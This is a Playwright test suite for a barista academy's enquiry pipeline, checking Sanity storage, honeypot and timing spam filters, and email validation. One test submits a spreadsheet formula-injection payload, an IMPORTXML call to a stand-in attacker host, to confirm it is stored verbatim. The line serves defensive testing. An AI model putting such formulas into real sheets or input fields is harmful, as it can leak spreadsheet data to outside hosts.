import { createClient, type SanityClient } from "@sanity/client";
import { expect, test, type APIRequestContext } from "@playwright/test";

/**
 * The lead pipeline: what actually happens to an enquiry after the form says "sent".
 *
 * **This suite changes state** — it writes real enquiry documents — so it lives in the serial
 * `booking` project alongside the payment tests rather than running six times over in parallel.
 * Every document it creates is named `PLAYWRIGHT` and deleted afterwards.
 *
 * The important assertion is not "the endpoint returned 200". Build 1 returned 200 when an email
 * was sent and 200 when it was not, and a lead that reached nobody looked exactly like one that
 * did. What is checked here is that the enquiry is **in Sanity**, because that is the store the
 * academy actually opens, and that the fan-out to email, the spreadsheet and Meta can each be
 * absent without the lead being lost.
 */

const TEST_NAME = "PLAYWRIGHT Test Lead";
const TURNSTILE_TOKEN = "playwright.dummy.token";

function sanity(): SanityClient | null {
  const projectId = process.env.NEXT_PUBLIC_SANITY_PROJECT_ID?.trim();
  const dataset = process.env.NEXT_PUBLIC_SANITY_DATASET?.trim();
  const token = process.env.SANITY_API_WRITE_TOKEN?.trim();
  if (!projectId || !dataset || !token) return null;
  return createClient({
    projectId,
    dataset,
    token,
    apiVersion: process.env.NEXT_PUBLIC_SANITY_API_VERSION?.trim() || "2026-09-05",
    useCdn: false,
  });
}

interface StoredEnquiry {
  _id: string;
  type: string;
  name: string;
  phone: string;
  email: string | null;
  message: string | null;
  status: string;
  courseSlug: string | null;
  instanceId: string | null;
  source: Record<string, string> | null;
}

/** The enquiries this suite created, newest first. */
async function readTestEnquiries(client: SanityClient): Promise<StoredEnquiry[]> {
  return client.fetch<StoredEnquiry[]>(
    `*[_type == "enquiry" && name == $name] | order(createdAt desc) {
      _id, type, name, phone, email, message, status,
      "courseSlug": course->slug.current,
      "instanceId": instance._ref,
      source
    }`,
    { name: TEST_NAME },
  );
}

async function submit(
  request: APIRequestContext,
  overrides: Record<string, unknown> = {},
): Promise<{ status: number; body: Record<string, unknown> }> {
  const response = await request.post("/api/enquiry", {
    data: {
      type: "student",
      name: TEST_NAME,
      phone: "9876543210",
      consent: true,
      company: "",
      elapsedMs: 5000,
      turnstileToken: TURNSTILE_TOKEN,
      page: "/enquire",
      ...overrides,
    },
  });
  return { status: response.status(), body: (await response.json()) as Record<string, unknown> };
}

test.describe("the enquiry pipeline", () => {
  const client = sanity();
  test.skip(!client, "No Sanity write token in this environment");

  test.afterAll(async () => {
    if (!client) return;
    await client.delete({ query: `*[_type == "enquiry" && name == $name]`, params: { name: TEST_NAME } });
  });

  test("a student enquiry lands in Sanity with its course and its campaign", async ({ request }) => {
    const { status, body } = await submit(request, {
      course: "italian-barista-course-basic",
      email: "playwright@example.com",
      message: "PLAYWRIGHT: which level should I start at?",
      utm: { utm_source: "google", utm_medium: "cpc", utm_campaign: "ibc-basic-sept" },
    });

    expect(status).toBe(200);
    expect(body.ok).toBe(true);

    const stored = await readTestEnquiries(client as SanityClient);
    const enquiry = stored[0];
    expect(enquiry, "the enquiry should be in Sanity, not only in an inbox").toBeTruthy();
    expect(enquiry?.type).toBe("student");
    expect(enquiry?.phone).toBe("+919876543210");
    expect(enquiry?.email).toBe("playwright@example.com");
    // The form sends a slug; the route resolves it to a real course reference.
    expect(enquiry?.courseSlug).toBe("italian-barista-course-basic");
    expect(enquiry?.status).toBe("new");
    expect(enquiry?.source?.utm_campaign).toBe("ibc-basic-sept");
  });

  test("a waitlist enquiry is linked to the batch, so it appears on that batch's roster", async ({
    request,
  }) => {
    const { status } = await submit(request, {
      type: "waitlist",
      course: "italian-barista-course-basic",
      instanceId: "instance-e2e-test-batch",
    });
    expect(status).toBe(200);

    const stored = await readTestEnquiries(client as SanityClient);
    const waitlist = stored.find((enquiry) => enquiry.type === "waitlist");
    expect(waitlist).toBeTruthy();
    expect(waitlist?.instanceId).toBe("instance-e2e-test-batch");
  });

  test("a cafe enquiry is typed as one, so it can be routed to its own inbox", async ({
    request,
  }) => {
    const { status } = await submit(request, {
      type: "cafe",
      message: "PLAYWRIGHT: six baristas, opening in November.",
    });
    expect(status).toBe(200);

    const stored = await readTestEnquiries(client as SanityClient);
    expect(stored.some((enquiry) => enquiry.type === "cafe")).toBe(true);
  });

  test("a lead survives every optional destination being absent", async ({ request }) => {
    /*
     * This environment has no GOOGLE_SHEETS_* and no META_CAPI_ACCESS_TOKEN, so the spreadsheet
     * and the Meta event are both skipped for real rather than mocked. The point of the phase is
     * that neither absence costs the academy the lead.
     */
    expect(process.env.GOOGLE_SHEETS_ID ?? "").toBe("");
    expect(process.env.META_CAPI_ACCESS_TOKEN ?? "").toBe("");

    const before = (await readTestEnquiries(client as SanityClient)).length;
    const { status, body } = await submit(request, { message: "PLAYWRIGHT: no sheets, no meta" });
    expect(status).toBe(200);
    expect(body.ok).toBe(true);

    const after = (await readTestEnquiries(client as SanityClient)).length;
    expect(after).toBe(before + 1);
  });

  test("a formula in a name is stored verbatim in Sanity, which is not a spreadsheet", async ({
    request,
  }) => {
    // The escaping belongs to the sheet writer, not to the store: neutering the value here would
    // mean the academy sees an apostrophe in the Studio for no reason. tests/unit covers the sheet.
    const { status } = await submit(request, {
      message: '=IMPORTXML("http://attacker.example","//a")',
    });
    expect(status).toBe(200);

    const stored = await readTestEnquiries(client as SanityClient);
    const injected = stored.find((enquiry) => enquiry.message?.startsWith("=IMPORTXML"));
    expect(injected?.message).toBe('=IMPORTXML("http://attacker.example","//a")');
  });

  test("a bot that fills the honeypot gets a 200 and creates nothing", async ({ request }) => {
    const before = (await readTestEnquiries(client as SanityClient)).length;
    const { status, body } = await submit(request, { company: "spam-bot" });

    // 200 on purpose: a bot must not learn which field caught it.
    expect(status).toBe(200);
    expect(body.ok).toBe(true);

    const after = (await readTestEnquiries(client as SanityClient)).length;
    expect(after).toBe(before);
  });

  test("a submission faster than a person can type creates nothing", async ({ request }) => {
    const before = (await readTestEnquiries(client as SanityClient)).length;
    const { status } = await submit(request, { elapsedMs: 50 });
    expect(status).toBe(200);
    const after = (await readTestEnquiries(client as SanityClient)).length;
    expect(after).toBe(before);
  });

  test("a bad email is rejected before anything is written", async ({ request }) => {
    const before = (await readTestEnquiries(client as SanityClient)).length;
    const { status, body } = await submit(request, { email: "not-an-email" });
    expect(status).toBe(400);
    expect((body.errors as Record<string, string>).email).toBeTruthy();
    const after = (await readTestEnquiries(client as SanityClient)).length;
    expect(after).toBe(before);
  });

  test("no email at all is fine: a phone number is enough to have a conversation", async ({
    request,
  }) => {
    const { status, body } = await submit(request, { email: "" });
    expect(status).toBe(200);
    expect(body.ok).toBe(true);
  });
});
